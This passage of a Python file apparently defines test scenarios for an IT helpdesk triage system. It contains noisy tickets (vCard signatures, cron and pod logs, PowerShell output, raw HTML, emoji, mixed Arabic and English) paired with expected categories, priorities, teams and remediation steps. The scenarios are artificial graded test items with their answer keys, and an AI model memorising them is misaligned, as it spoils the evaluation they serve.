                "Investigate mass VPN account lockouts for 5 remote users that "
                "correlate with last night's password policy change — users cannot "
                "work remotely."
            ),
            remediation_steps=[
                "Unlock the 5 affected accounts (mchen02, bwilson04, dkimura06, "
                "fjohansson08, iali11) in Active Directory immediately.",
                "Review the password policy GPO change from last night to determine "
                "if it invalidated existing credentials or changed lockout thresholds.",
                "Check Azure AD sign-in logs for the locked accounts to confirm "
                "the lockout was caused by repeated failed authentication, not an attack.",
                "If the policy change caused the lockouts, communicate to all remote "
                "users that they may need to update their cached credentials.",
                "Consider a phased rollout for future password policy changes with advance notice to remote workers.",
            ],
            reporter_name="Kevin Abrams",
            reporter_email="kevin.abrams@contoso.com",
            reporter_department="Network Operations",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "tsv-data", "tabular-data", "spreadsheet-paste", "bulk-report"],
            difficulty="medium",
        ),
        # ── DC-058  vCard data in email signature ─────────────────────────
        ScenarioDefinition(
            scenario_id="DC-058",
            subject="Badge reader on Floor 8 not recognizing my card",
            description=(
                "Hi,\n\n"
                "The badge reader on the main entrance to Floor 8, Building 2 is not "
                "recognizing my access card. I tap it and the light stays red — no beep, "
                "nothing. I've been piggybacking through with colleagues all day. My badge "
                "number is CF-2026-8841. Other people's badges seem to work fine on the "
                "same reader.\n\n"
                "I got a new badge issued two weeks ago because my old one cracked. The "
                "new one works on the ground floor and parking garage readers, just not "
                "on Floor 8.\n\n"
                "Best regards,\n\n"
                "BEGIN:VCARD\n"
                "VERSION:3.0\n"
                "N:Bergstrom;Henrik;;Mr.;\n"
                "FN:Henrik Bergstrom\n"
                "ORG:Contoso Financial Services;Institutional Trading\n"
                "TITLE:Senior Trader\n"
                "TEL;TYPE=WORK,VOICE:+1-212-555-0147\n"
                "TEL;TYPE=CELL:+1-917-555-0293\n"
                "TEL;TYPE=WORK,FAX:+1-212-555-0148\n"
                "ADR;TYPE=WORK:;;One Contoso Plaza, Floor 8;New York;NY;10001;USA\n"
                "EMAIL;TYPE=PREF,INTERNET:henrik.bergstrom@contoso.com\n"
                "URL:https://www.contoso.com/people/hbergstrom\n"
                "PHOTO;TYPE=JPEG;ENCODING=BASE64:/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAAg\n"
                " GBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDA\n"
                " xNDQ0Hyc5PTgyPC4zNDL/2wBDAQkJCQwLDBgNDRgyIRwhMjIyMjIyMjIyMjIyMjI\n"
                " yMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjL/wAARCAAQABADASIAAh\n"
                "NOTE:Bloomberg: HBERG <GO>\\nReuters: henrik.bergstrom.contoso\n"
                "REV:20260301T120000Z\n"
                "END:VCARD\n\n"
                "CONFIDENTIALITY NOTICE: This email and any attachments are for the "
                "exclusive and confidential use of the intended recipient. If you are "
                "not the intended recipient, please do not read, distribute, or take "
                "action based on this message."
            ),
            category=Category.HARDWARE,
            priority=Priority.P3,
            team=Team.ENDPOINT,
            needs_escalation=False,
            missing_info=[MissingInfo.DEVICE_INFO],
            next_best_action=(
                "Investigate access card CF-2026-8841 not being recognized by the "
                "Floor 8 badge reader in Building 2 — card works on ground floor "
                "and parking but not Floor 8. Likely a provisioning issue with "
                "the replacement card's floor access permissions."
            ),
            remediation_steps=[
                "Check the physical access control system (PACS) to verify badge "
                "CF-2026-8841 has Floor 8, Building 2 access permissions.",
                "Compare the new badge's access group assignments with the old badge "
                "to identify any missing floor-level permissions.",
                "Add Floor 8 access to the new badge if it was not provisioned during the replacement process.",
                "Test the badge on the Floor 8 reader after updating permissions.",
                "Audit the badge replacement workflow to ensure floor-level "
                "permissions are copied from old badges to replacements.",
            ],
            reporter_name="Henrik Bergstrom",
            reporter_email="henrik.bergstrom@contoso.com",
            reporter_department="Institutional Trading",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "vcard-data", "email-signature", "contact-noise", "base64"],
            difficulty="easy",
        ),
        # ── DC-059  Cron job / Task Scheduler output dump ─────────────────
        ScenarioDefinition(
            scenario_id="DC-059",
            subject="FW: Cron job failures on PROD-RPT-01 — overnight batch report",
            description=(
                "IT team — forwarding the output from our overnight batch reporting "
                "server. Reports haven't been generated since Saturday. The full "
                "cron output is below:\n\n"
                "CRON JOB EXECUTION LOG — PROD-RPT-01\n"
                "======================================\n"
                "Host: PROD-RPT-01.contoso.local\n"
                "Run date: 2026-03-17 02:00:00 EST\n"
                "Job: /opt/contoso/reports/generate_daily_reports.sh\n"
                "Schedule: 0 2 * * * (daily at 02:00)\n"
                "User: svc_reports\n"
                "PID: 28451\n\n"
                "[02:00:01] Starting daily report generation...\n"
                "[02:00:01] Connecting to database server PROD-SQL-03.contoso.local:1433...\n"
                "[02:00:02] Connection established. Authenticating as svc_reports...\n"
                "[02:00:02] Authentication successful.\n"
                "[02:00:03] Executing report: P&L Daily Summary (report_id: RPT-001)...\n"
                "[02:00:03] Query: SELECT * FROM dbo.vw_PnL_Daily WHERE trade_date = '2026-03-16'\n"
                "[02:00:04] Rows returned: 1,247\n"
                "[02:00:04] Generating PDF... OK (2.3 MB)\n"
                "[02:00:05] Uploading to SharePoint /sites/finance/reports/daily/... OK\n"
                "[02:00:06] Executing report: Risk Exposure Summary (report_id: RPT-002)...\n"
                "[02:00:06] Query: EXEC dbo.sp_RiskExposure @date='2026-03-16'\n"
                "[02:00:06] ERROR: Execution Timeout Expired. The timeout period elapsed prior "
                "to completion of the operation or the server is not responding.\n"
                "[02:00:06] SQL State: HYT00, Native Error: 0\n"
                "[02:00:06] Connection to PROD-SQL-03.contoso.local lost.\n"
                "[02:00:07] Attempting reconnection (1/3)...\n"
                "[02:00:37] Reconnection attempt 1 failed: Connection timed out.\n"
                "[02:00:37] Attempting reconnection (2/3)...\n"
                "[02:01:07] Reconnection attempt 2 failed: Connection timed out.\n"
                "[02:01:07] Attempting reconnection (3/3)...\n"
                "[02:01:37] Reconnection attempt 3 failed: Connection timed out.\n"
                "[02:01:37] FATAL: All reconnection attempts exhausted. Aborting remaining reports.\n"
                "[02:01:37] Reports NOT generated: RPT-002, RPT-003, RPT-004, RPT-005, RPT-006\n"
                "[02:01:37] Exit code: 1\n"
                "[02:01:37] Notification sent to: ops-alerts@contoso.com\n\n"
                "Same failure repeated on 2026-03-15 and 2026-03-16 logs. The first "
                "report (P&L Daily) always succeeds but the Risk Exposure stored proc "
                "kills the connection. We need these reports for the morning risk "
                "committee meeting at 8 AM.\n\n"
                "Sophie Laurent\nRisk Management"
            ),
            category=Category.DATA_STORAGE,
            priority=Priority.P2,
            team=Team.DATA_PLATFORM,
            needs_escalation=False,
            missing_info=[MissingInfo.ENVIRONMENT_DETAILS, MissingInfo.CONFIGURATION_DETAILS],
            next_best_action=(
                "Investigate dbo.sp_RiskExposure stored procedure timeout on "
                "PROD-SQL-03 causing overnight batch report failures for 3 consecutive "
                "nights — Risk Exposure and 4 downstream reports are not being generated."
            ),
            remediation_steps=[
                "Check PROD-SQL-03 for long-running queries, blocking sessions, or "
                "resource exhaustion around the 02:00 AM window.",
                "Review the execution plan for dbo.sp_RiskExposure — it may need "
                "index tuning or statistics updates after recent data growth.",
                "Check if the timeout is caused by a lock conflict with another "
                "overnight process (e.g., a maintenance or ETL job).",
                "Increase the command timeout for the report generation script as "
                "a temporary measure while the stored procedure is optimized.",
                "Manually trigger the report generation for the missed dates "
                "(2026-03-15, 16, 17) once the issue is resolved.",
            ],
            reporter_name="Sophie Laurent",
            reporter_email="sophie.laurent@contoso.com",
            reporter_department="Risk Management",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "cron-output", "scheduled-task", "log-dump", "batch-job"],
            difficulty="medium",
        ),
        # ── DC-060  Multiple concatenated ticket descriptions ─────────────
        ScenarioDefinition(
            scenario_id="DC-060",
            subject="FW: FW: FW: Batch of issues from London office — please triage",
            description=(
                "Hi team,\n\n"
                "Our London office manager forwarded a batch of issues that were "
                "collected at this morning's all-hands. I'm dumping them all into "
                "one ticket because our portal was down earlier. Please split these "
                "out as needed.\n\n"
                "=== ISSUE 1 (from Tom Bradley, Settlements) ===\n"
                "The settlement reconciliation app crashes every time I try to "
                "export to CSV. Error: 'System.OutOfMemoryException'. It started "
                "after the latest update on Friday. Machine: LDN-WS-1147.\n\n"
                "=== ISSUE 2 (from Amara Osei, Client Services) ===\n"
                "WiFi in the London office 3rd floor conference rooms A, B, and C "
                "has been extremely slow since they installed the new partitions "
                "last week. Video calls keep freezing. We have client meetings "
                "there daily.\n\n"
                "=== ISSUE 3 (from Liam McDonnell, Compliance) ===\n"
                "I need access to the GDPR Data Subject Request portal. I "
                "transferred from the Dublin office last month and my access "
                "was supposed to follow me but it didn't. My manager is Fiona "
                "O'Leary.\n\n"
                "=== ISSUE 4 (from Yuki Sato, Quantitative Analysis) ===\n"
                "Our Bloomberg Terminal (serial: BT-LDN-0093) has been showing "
                "'Connection to B-PIPE lost' intermittently. The data feed drops "
                "for 30-60 seconds every hour or so. We're in the middle of "
                "model validation and need reliable market data.\n\n"
                "=== ISSUE 5 (from Grace Nkomo, HR) ===\n"
                "The HR shared mailbox (hr-london@contoso.com) is bouncing "
                "incoming emails with 'Mailbox full' errors. We've already "
                "archived everything older than 6 months but it's still at 49.8 GB "
                "of the 50 GB limit.\n\n"
                "Sorry for the messy format — our portal should be back up now.\n\n"
                "Daniel Fischer\nFacilities, London Office"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P2,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[
                MissingInfo.AFFECTED_SYSTEM,
                MissingInfo.AFFECTED_USERS,
                MissingInfo.BUSINESS_IMPACT,
            ],
            next_best_action=(
                "This ticket contains 5 separate issues from the London office "
                "bundled into one submission. The highest-impact items are the "
                "settlement app crash (OutOfMemoryException) and the Bloomberg "
                "Terminal data feed drops. Split into individual tickets and "
                "triage each with the appropriate team."
            ),
            remediation_steps=[
                "Create separate tickets for each of the 5 reported issues and "
                "assign to the appropriate teams: Enterprise Apps (Issue 1), "
                "Network Ops (Issue 2), IAM (Issue 3), Enterprise Apps (Issue 4), "
                "Enterprise Apps (Issue 5).",
                "Prioritize Issue 1 (settlement app crash) and Issue 4 (Bloomberg "
                "data feed) as they directly impact trading and settlement operations.",
                "For Issue 1: Investigate the OutOfMemoryException in the settlement "
                "reconciliation app after Friday's update — likely a memory leak in "
                "the CSV export code path.",
                "For Issue 2: Coordinate with Network Ops to assess WiFi coverage "
                "changes after the new partition installation on the 3rd floor.",
                "For Issue 5: Increase the HR shared mailbox quota or implement an "
                "auto-archive policy to prevent the 50 GB limit from being hit again.",
            ],
            reporter_name="Daniel Fischer",
            reporter_email="daniel.fischer@contoso.com",
            reporter_department="Facilities",
            channel=Channel.EMAIL,
            tags=[
                "data-cleanup",
                "concatenated-tickets",
                "multi-issue",
                "batch-submission",
                "buried-issue",
            ],
            difficulty="hard",
        ),
        # ── DC-061  ALL CAPS email with poor grammar ─────────────────────
        ScenarioDefinition(
            scenario_id="DC-061",
            subject="VPN NOT WORKING AGAIN PLEASE FIX",
            description=(
                "HI IT TEAM\n\n"
                "MY VPN IS NOT WORKING AGAIN. I TRYED TO CONNECT THIS "
                "MORNING AND IT SAYS CONECTION FAILED. I RESTARTED MY "
                "LAPTOP AND TRYED AGAIN BUT SAME THING. I NEED TO "
                "ACCESS THE TRADING PLATFORM AND CANT DO ANYTHING "
                "WITHOUT VPN. THIS HAPPENS EVERY WEEK AND NOBODY "
                "FIXES IT. I AM ON THE 4TH FLOOR BUILDING 2 IN NEW "
                "YORK. MY LAPTOP IS A LENOVO THINKPAD T14. I AM USING "
                "WINDOWS 11. THE VPN CLIENT IS GLOBALPROTECT. WHEN I "
                "CLICK CONNECT IT SPINS FOR ABOUT 30 SECONDS THEN "
                "SAYS GATEWAY NOT REACHABLE. I ASKED MY COLLEAGUE AND "
                "HIS VPN WORKS FINE SO ITS JUST MY MACHINE. PLEASE "
                "HELP URGENTLY I HAVE A CLIENT CALL AT 10AM AND NEED "
                "ACCESS TO THE PORTFOLIO MANAGEMENT SYSTEM.\n\n"
                "THANKS\nKEVIN"
            ),
            category=Category.NETWORK,
            priority=Priority.P3,
            team=Team.NETWORK_OPS,
            needs_escalation=False,
            missing_info=[
                MissingInfo.APPLICATION_VERSION,
                MissingInfo.ERROR_MESSAGE,
            ],
            next_best_action=(
                "Diagnose GlobalProtect VPN 'gateway not reachable' "
                "error for a single user on Floor 4, Building 2 NYC "
                "— colleague on same floor is unaffected, suggesting "
                "a client-side or profile configuration issue."
            ),
            remediation_steps=[
                "Verify the user's GlobalProtect client version and update if outdated.",
                "Check the VPN gateway address configured on the client — it may have been corrupted after an update.",
                "Run 'netsh winsock reset' and flush DNS to rule out local networking stack issues.",
                "If the issue persists, remove and reinstall the GlobalProtect VPN client.",
                "Confirm network connectivity to the VPN gateway IP directly using ping and traceroute.",
            ],
            reporter_name="Kevin Marsh",
            reporter_email="kevin.marsh@contoso.com",
            reporter_department="Portfolio Management",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "all-caps", "poor-formatting"],
            difficulty="medium",
        ),
        # ── DC-062  Extremely long subject line ──────────────────────────
        ScenarioDefinition(
            scenario_id="DC-062",
            subject=(
                "Bloomberg Terminal license renewal request for the "
                "Quantitative Analysis team — license key BBGTERM-"
                "QA-2026-0047 is expiring on March 31 and we need "
                "it renewed before end of month or we lose access "
                "to the B-PIPE data feed which is critical for our "
                "model calibration pipeline"
            ),
            description=(
                "Hi IT,\n\n"
                "As mentioned in the subject, our Bloomberg Terminal "
                "license (key: BBGTERM-QA-2026-0047) is set to expire "
                "on March 31, 2026. This license covers 3 terminals "
                "used by our quant team for real-time market data via "
                "the B-PIPE feed.\n\n"
                "We already have budget approval from our department "
                "head (Maria Santos). The renewal PO was submitted "
                "through Ariba last week (PO-2026-11847).\n\n"
                "Can you coordinate with Bloomberg to ensure the "
                "license is renewed before the expiry date? If we "
                "lose access even for a day it will disrupt our risk "
                "model validation cycle.\n\n"
                "Thanks,\nAndrew Kim\nQuantitative Analysis"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P3,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[MissingInfo.CONFIGURATION_DETAILS],
            next_best_action=(
                "Coordinate Bloomberg Terminal license renewal for "
                "key BBGTERM-QA-2026-0047 expiring March 31 — PO "
                "already submitted via Ariba (PO-2026-11847). Verify "
                "renewal status with Bloomberg rep."
            ),
            remediation_steps=[
                "Confirm the Ariba PO (PO-2026-11847) has been approved and transmitted to Bloomberg.",
                "Contact the Bloomberg account representative to verify the renewal is in progress.",
                "If the renewal cannot be completed before March 31, request a temporary extension from Bloomberg.",
                "Verify the B-PIPE data feed configuration will survive the license rollover without reconfiguration.",
                "Notify the quant team of the renewal timeline and any expected downtime window.",
            ],
            reporter_name="Andrew Kim",
            reporter_email="andrew.kim@contoso.com",
            reporter_department="Quantitative Analysis",
            channel=Channel.PORTAL,
            tags=[
                "data-cleanup",
                "long-subject",
                "unusual-formatting",
            ],
            difficulty="easy",
        ),
        # ── DC-063  Kubernetes / Docker container log dump ───────────────
        ScenarioDefinition(
            scenario_id="DC-063",
            subject="Risk calculation service crashing in production",
            description=(
                "The risk-calc-service keeps crashing in our AKS "
                "cluster. Here are the pod logs:\n\n"
                "$ kubectl logs risk-calc-service-7b9f4d6c8-xk2mv "
                "--tail=100\n"
                "2026-03-18T08:14:01.223Z [INFO] Starting risk-calc-"
                "service v3.2.1 (commit: a4f8e2d)\n"
                "2026-03-18T08:14:01.224Z [INFO] Connecting to "
                "Azure SQL: tcp:contoso-prod-sql.database.windows"
                ".net:1433\n"
                "2026-03-18T08:14:02.118Z [INFO] DB connection pool "
                "initialized (min=5, max=50)\n"
                "2026-03-18T08:14:02.119Z [INFO] Loading risk models "
                "from blob storage...\n"
                "2026-03-18T08:14:05.447Z [INFO] Loaded 47 risk "
                "models (1.2 GB total)\n"
                "2026-03-18T08:14:05.448Z [INFO] Starting gRPC "
                "server on :8443\n"
                "2026-03-18T08:14:05.449Z [INFO] Health check "
                "endpoint ready on :8080/healthz\n"
                "2026-03-18T08:14:05.450Z [INFO] Ready to accept "
                "requests\n"
                "2026-03-18T08:22:17.891Z [WARN] Memory usage at "
                "78% (3.12 GB / 4 GB limit)\n"
                "2026-03-18T08:22:18.002Z [WARN] GC pressure high "
                "— consider increasing memory limit\n"
                "2026-03-18T08:25:33.114Z [ERROR] OutOfMemoryError "
                "in VaR calculation for portfolio PF-2847\n"
                "2026-03-18T08:25:33.115Z [ERROR] java.lang.Out"
                "OfMemoryError: Java heap space\n"
                "    at com.contoso.risk.VaREngine.calculate"
                "(VaREngine.java:287)\n"
                "    at com.contoso.risk.BatchProcessor.process"
                "(BatchProcessor.java:142)\n"
                "    at com.contoso.risk.grpc.RiskServiceImpl"
                ".calculateRisk(RiskServiceImpl.java:58)\n"
                "2026-03-18T08:25:33.116Z [FATAL] Unrecoverable "
                "error — shutting down\n\n"
                "$ kubectl describe pod risk-calc-service-7b9f4d6c8"
                "-xk2mv\n"
                "Name:         risk-calc-service-7b9f4d6c8-xk2mv\n"
                "Namespace:    prod-risk\n"
                "Node:         aks-nodepool1-38274651-vmss000003\n"
                "Status:       CrashLoopBackOff\n"
                "Restart Count: 7\n"
                "Containers:\n"
                "  risk-calc:\n"
                "    Image:    contosoacr.azurecr.io/risk-calc"
                ":3.2.1\n"
                "    Limits:   cpu: 2, memory: 4Gi\n"
                "    Requests: cpu: 500m, memory: 2Gi\n"
                "    State:    Waiting (CrashLoopBackOff)\n"
                "    Last State: Terminated (OOMKilled)\n"
                "Events:\n"
                "  Warning  OOMKilled  3m  kubelet  Container "
                "risk-calc exceeded memory limit\n"
                "  Warning  BackOff    1m  kubelet  Back-off "
                "restarting failed container\n\n"
                "This started after we deployed v3.2.1 on Friday. "
                "The previous version (v3.2.0) ran fine with the "
                "same memory limits."
            ),
            category=Category.SOFTWARE,
            priority=Priority.P2,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[MissingInfo.ENVIRONMENT_DETAILS],
            next_best_action=(
                "Investigate OOMKilled crash in risk-calc-service "
                "v3.2.1 — the pod is in CrashLoopBackOff with Java "
                "heap OOM during VaR calculation. Likely a memory "
                "regression introduced in the v3.2.1 deployment."
            ),
            remediation_steps=[
                "Roll back risk-calc-service from v3.2.1 to v3.2.0 to restore production stability immediately.",
                "Compare heap usage profiles between v3.2.0 and v3.2.1 to identify the memory regression.",
                "Investigate the VaR calculation path for portfolio PF-2847 — it may involve unusually large datasets.",
                "Consider increasing the pod memory limit from 4Gi "
                "to 8Gi as a temporary measure if rollback is not "
                "feasible.",
                "Add memory usage alerts at 70% threshold to catch future regressions before OOMKill.",
            ],
            reporter_name="Priya Nair",
            reporter_email="priya.nair@contoso.com",
            reporter_department="Cloud Infrastructure",
            channel=Channel.PORTAL,
            tags=[
                "data-cleanup",
                "container-logs",
                "k8s-output",
                "log-dump",
            ],
            difficulty="medium",
        ),
        # ── DC-064  Emoji-only subject with emoji-heavy description ──────
        ScenarioDefinition(
            scenario_id="DC-064",
            subject="\U0001f5a8\ufe0f\u274c\U0001f6a8\U0001f62d\U0001f44e",
            description=(
                "\U0001f5a8\ufe0f The printer on Floor 6 near the "
                "kitchen \U0001f373 is not working again \U0001f62d"
                "\U0001f62d\U0001f62d\n\n"
                "I tried printing my expense report \U0001f4b8 and "
                "it just shows 'Error' on the display \u274c\n\n"
                "Other people are having the same problem \U0001f46b"
                "\U0001f46c\U0001f46d so it's not just me \U0001f937"
                "\u200d\u2642\ufe0f\n\n"
                "The lights on the printer are blinking \U0001f6a8"
                "\U0001f6a8\U0001f6a8 red and yellow\n\n"
                "Can someone please come fix it \U0001f64f\U0001f64f"
                "\U0001f64f\n\n"
                "It's the HP Color LaserJet \U0001f5a8\ufe0f near "
                "room 6.12 \U0001f3e2\n\n"
                "Thanks \U0001f44d\U0001f44d\U0001f44d"
            ),
            category=Category.HARDWARE,
            priority=Priority.P4,
            team=Team.ENDPOINT,
            needs_escalation=False,
            missing_info=[
                MissingInfo.ERROR_MESSAGE,
                MissingInfo.DEVICE_INFO,
            ],
            next_best_action=(
                "Investigate HP Color LaserJet error on Floor 6 "
                "near room 6.12 — blinking red/yellow LEDs and "
                "display showing 'Error'. Multiple users affected."
            ),
            remediation_steps=[
                "Check the printer's LCD display for a specific error code or message.",
                "Open the printer and check for paper jams, low toner, or imaging drum issues.",
                "Power-cycle the printer and check if the error clears on reboot.",
                "If LEDs continue blinking red/yellow, consult "
                "the HP service manual for the specific LED "
                "pattern meaning.",
                "If hardware failure is confirmed, open a warranty or service request with HP.",
            ],
            reporter_name="Tomas Reyes",
            reporter_email="tomas.reyes@contoso.com",
            reporter_department="Client Services",
            channel=Channel.CHAT,
            tags=[
                "data-cleanup",
                "emoji-subject",
                "emoji-heavy",
            ],
            difficulty="medium",
        ),
        # ── DC-065  PowerShell verbose output dump ───────────────────────
        ScenarioDefinition(
            scenario_id="DC-065",
            subject="Intune app deployment failing — PowerShell log",
            description=(
                "The Intune Win32 app deployment for CyberArk "
                "Privilege Cloud is failing on all machines in the "
                "Trading department. Here's the verbose PowerShell "
                "output from a manual test run:\n\n"
                "PS C:\\> Install-CyberArkAgent.ps1 -Verbose\n"
                "VERBOSE: Starting CyberArk Privilege Cloud agent "
                "installation v12.6.2\n"
                "VERBOSE: Checking prerequisites...\n"
                "VERBOSE: .NET Framework 4.8: OK (4.8.09032)\n"
                "VERBOSE: Visual C++ 2019 Redistributable: OK\n"
                "VERBOSE: Checking service 'CyberArkAgent'... Not "
                "found (expected for fresh install)\n"
                "VERBOSE: Downloading installer from https://pkg"
                ".cyberark.com/agents/v12.6.2/CyberArkAgent.msi\n"
                "VERBOSE: Download complete (48.7 MB)\n"
                "VERBOSE: Verifying SHA256 hash: a4f8e2d1b7c9...\n"
                "VERBOSE: Hash verification: OK\n"
                "VERBOSE: Running MSI installer with parameters:\n"
                "VERBOSE:   /i CyberArkAgent.msi /qn /norestart\n"
                "VERBOSE:   PVWAURL=https://contoso.privilegecloud"
                ".cyberark.cloud\n"
                "VERBOSE:   APPUSERID=svc-intune-deploy\n"
                "VERBOSE: MSI installer started (PID: 14832)\n"
                "VERBOSE: Waiting for installation to complete...\n"
                "VERBOSE: MSI installer exited with code: 1603\n"
                "VERBOSE: ERROR — MSI installation failed!\n"
                "VERBOSE: Checking Windows Installer log: C:\\Temp"
                "\\CyberArkInstall.log\n"
                "VERBOSE: Log excerpt: 'Error 1920: Service "
                "'CyberArk Agent' (CyberArkAgent) failed to start. "
                "Verify that you have sufficient privileges.'\n"
                "VERBOSE: The service account 'svc-intune-deploy' "
                "may lack 'Log on as a service' rights.\n"
                "VERBOSE: Checking local security policy...\n"
                "VERBOSE: 'Log on as a service': CONTOSO\\svc-intune"
                "-deploy is NOT listed\n"
                "VERBOSE: Cleanup: removing partial installation...\n"
                "VERBOSE: Cleanup complete.\n"
                "VERBOSE: Installation FAILED — exit code 1603\n\n"
                "Can you grant the service account the required "
                "privilege so we can deploy?"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P2,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[MissingInfo.AFFECTED_USERS],
            next_best_action=(
                "Grant 'Log on as a service' right to svc-intune-"
                "deploy so the CyberArk Agent MSI can start its "
                "Windows service during Intune deployment."
            ),
            remediation_steps=[
                "Add CONTOSO\\svc-intune-deploy to the 'Log on as "
                "a service' local security policy via GPO or "
                "secpol.msc.",
                "Verify the service account has the correct permissions on the target machines.",
                "Re-run the Intune Win32 app deployment after the policy change propagates.",
                "Validate the installation completes successfully on a test machine before fleet-wide deployment.",
                "Update the Intune deployment documentation to include the 'Log on as a service' prerequisite.",
            ],
            reporter_name="Raj Patel",
            reporter_email="raj.patel@contoso.com",
            reporter_department="IT Security",
            channel=Channel.EMAIL,
            tags=[
                "data-cleanup",
                "powershell-output",
                "verbose-logs",
                "terminal-output",
            ],
            difficulty="medium",
        ),
        # ── DC-066  Browser view-source HTML paste ───────────────────────
        ScenarioDefinition(
            scenario_id="DC-066",
            subject="Internal expense portal showing error page",
            description=(
                "When I try to submit my expense report on the "
                "internal portal I get an error page. I did "
                "view-source and this is what I see:\n\n"
                '<!DOCTYPE html>\n<html lang="en">\n<head>\n'
                '  <meta charset="UTF-8">\n'
                "  <title>500 - Internal Server Error</title>\n"
                "  <style>\n"
                "    body { font-family: Segoe UI, sans-serif; "
                "margin: 40px; background: #f5f5f5; }\n"
                "    .error-container { background: white; "
                "padding: 30px; border-radius: 8px; }\n"
                "    .error-code { color: #d32f2f; font-size: "
                "72px; font-weight: bold; }\n"
                "    .stack-trace { background: #f5f5f5; "
                "padding: 15px; font-family: Consolas; "
                "font-size: 12px; overflow-x: auto; }\n"
                "  </style>\n</head>\n<body>\n"
                '  <div class="error-container">\n'
                '    <div class="error-code">500</div>\n'
                "    <h1>Internal Server Error</h1>\n"
                "    <p>An unhandled exception occurred while "
                "processing the request.</p>\n"
                '    <div class="stack-trace">\n'
                "      System.InvalidOperationException: The "
                "connection pool has been exhausted.\n"
                "        at Microsoft.Data.SqlClient.SqlInternal"
                "ConnectionPool.GetConnection()\n"
                "        at Contoso.Expenses.Api.Controllers."
                "ExpenseController.Submit()\n"
                "        at lambda_method17(Closure, Object)\n"
                "    </div>\n"
                "    <!-- Request ID: 7f3a2b1c-4e8d-4f9a -->\n"
                "    <!-- Server: PROD-WEB-04 -->\n"
                "    <!-- Timestamp: 2026-03-18T09:15:22.847Z "
                "-->\n"
                "  </div>\n</body>\n</html>\n\n"
                "The URL is https://expenses.contoso.internal/"
                "submit and I'm using Chrome."
            ),
            category=Category.SOFTWARE,
            priority=Priority.P3,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[MissingInfo.STEPS_TO_REPRODUCE],
            next_best_action=(
                "Investigate 500 error on the expense portal — "
                "stack trace shows SQL connection pool exhaustion "
                "on PROD-WEB-04. Likely a connection leak or "
                "traffic spike."
            ),
            remediation_steps=[
                "Check PROD-WEB-04 for SQL connection pool exhaustion — review active and idle connection counts.",
                "Recycle the application pool on PROD-WEB-04 as an immediate mitigation.",
                "Review the ExpenseController.Submit() code path for connection leaks or missing Dispose() calls.",
                "Check if there was a traffic spike or slow query causing connections to be held longer than usual.",
                "Increase the connection pool MaxPoolSize if legitimate traffic growth is the root cause.",
            ],
            reporter_name="Helen Park",
            reporter_email="helen.park@contoso.com",
            reporter_department="Finance",
            channel=Channel.PORTAL,
            tags=[
                "data-cleanup",
                "view-source",
                "raw-html",
                "html-heavy",
            ],
            difficulty="medium",
        ),
        # ── DC-067  Mixed RTL/LTR text ───────────────────────────────────
        ScenarioDefinition(
            scenario_id="DC-067",
            subject=(
                "SharePoint access \u2014 "
                "\u0645\u0648\u0642\u0639 \u0634\u064a\u0631"
                "\u0628\u0648\u064a\u0646\u062a "
                "\u0644\u0627 \u064a\u0639\u0645\u0644"
            ),
            description=(
                "\u0645\u0631\u062d\u0628\u0627 IT team,\n\n"
                "\u0623\u0646\u0627 \u0645\u0646 "
                "\u0641\u0631\u064a\u0642 "
                "\u0627\u0644\u0627\u0645\u062a\u062b\u0627"
                "\u0644 (Compliance team) \u0641\u064a "
                "\u0645\u0643\u062a\u0628 London.\n\n"
                "I need access to the new SharePoint site for "
                "regulatory documents:\n"
                "https://contoso.sharepoint.com/sites/"
                "reg-docs-emea\n\n"
                "\u0639\u0646\u062f\u0645\u0627 "
                "\u0623\u062d\u0627\u0648\u0644 "
                "\u0627\u0644\u0648\u0635\u0648\u0644 "
                "\u0623\u062d\u0635\u0644 \u0639\u0644\u0649 "
                "\u0631\u0633\u0627\u0644\u0629 "
                "\u0627\u0644\u062e\u0637\u0623:\n"
                '"Access Denied — You do not have permission to '
                'access this resource."\n\n'
                "My manager \u0641\u0627\u0637\u0645\u0629 "
                "\u0627\u0644\u0639\u0644\u064a "
                "(Fatima Al-Ali) approved my access request "
                "through ServiceNow last week "
                "(REQ-2026-04821).\n\n"
                "\u0634\u0643\u0631\u0627\u064b (Thanks),\n"
                "Omar Hassan\n"
                "\u0642\u0633\u0645 "
                "\u0627\u0644\u0627\u0645\u062a\u062b\u0627"
                "\u0644 | Compliance Department"
            ),
            category=Category.DATA_STORAGE,
            priority=Priority.P3,
            team=Team.DATA_PLATFORM,
            needs_escalation=False,
            missing_info=[MissingInfo.AUTHENTICATION_METHOD],
            next_best_action=(
                "Grant SharePoint access to reg-docs-emea site "
                "for Omar Hassan — ServiceNow request REQ-2026-"
                "04821 already approved by manager Fatima Al-Ali."
            ),
            remediation_steps=[
                "Verify ServiceNow request REQ-2026-04821 is approved and includes the correct site URL.",
                "Add Omar Hassan to the appropriate SharePoint security group for reg-docs-emea.",
                "Confirm the user can access the site after permission changes propagate (up to 24 hours).",
                "If access is still denied, check for any "
                "Conditional Access policies blocking the London "
                "office IP range.",
                "Update the ServiceNow request to 'Fulfilled' once access is confirmed.",
            ],
            reporter_name="Omar Hassan",
            reporter_email="omar.hassan@contoso.com",
            reporter_department="Compliance",
            channel=Channel.EMAIL,
            tags=[
                "data-cleanup",
                "rtl-text",
                "mixed-direction",
                "multilingual",
            ],
            difficulty="medium",
        ),
        # ── DC-068  HTML form submission artifacts ───────────────────────
        ScenarioDefinition(
            scenario_id="DC-068",
            subject="Expense report portal submission error",
            description=(
                "I tried to submit my expense report and the portal "
                "gave me an error. Here is what I copied from the "
                "page:\n\n"
                'form action="/api/v2/expenses/submit" '
                'method="POST"\n'
                'input type="hidden" name="__csrf_token" '
